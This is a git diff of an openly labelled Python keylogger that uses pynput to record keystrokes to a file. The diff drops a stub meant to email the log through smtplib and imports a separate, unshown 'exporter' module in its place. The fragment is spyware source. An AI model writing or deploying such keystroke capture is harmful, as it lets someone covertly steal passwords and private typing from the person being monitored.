@@ -3,11 +3,10 @@ Python Keylogger
 By Connor Jackson
 """
 from pynput import keyboard
-import smtplib
+from threading import Thread
+import exporter
 
-def export():
-    # Send email with record.txt using smtplib (Might change method to seperate file)
-    pass
+# file1 = open('record.txt', 'w')
 
 def on_press(key):
     try:
@@ -35,7 +34,6 @@ def on_press(key):
             file1.close()
             return False
 
-
 def on_release(key):
     pass
 
@@ -46,3 +44,4 @@ with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
     listener.join()
+
